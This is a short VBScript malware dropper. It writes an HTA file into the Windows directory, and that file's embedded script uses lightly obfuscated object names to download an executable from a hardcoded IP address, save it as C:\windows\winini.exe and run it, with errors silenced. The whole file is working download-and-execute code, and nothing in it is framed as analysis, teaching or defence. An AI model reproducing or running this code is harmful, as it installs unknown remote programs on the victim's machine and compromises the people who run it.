on error resume next
set evanchik = CreateObject("ADODB.Recordset")
   With evanchik
       .Fields.Append "evanchik", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("evanchik").Value = "<script language=vbscript>: on error resume next : set o = CreateObject(""msxm""&""l2.XM""&""LHTTP"") : o.open ""GET"",""http://195.225.176.5/d/hzqfqfb/kmpsvtf/luauyen/rytgqp/IT/painter.exe"",False : o.send : set s = createobject(""adodb.st""&""ream"") : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""C:\windows\winini.exe"",2 : Set ws = CreateObject(""WScript.Shell"") : ws.Run ""C:\windows\winini.exe"", 3, FALSE : window.close : </script>"
       Call .Update
   End With
evanchik.Save "C:\windows\test.hta", adPersistXML
evanchik.Close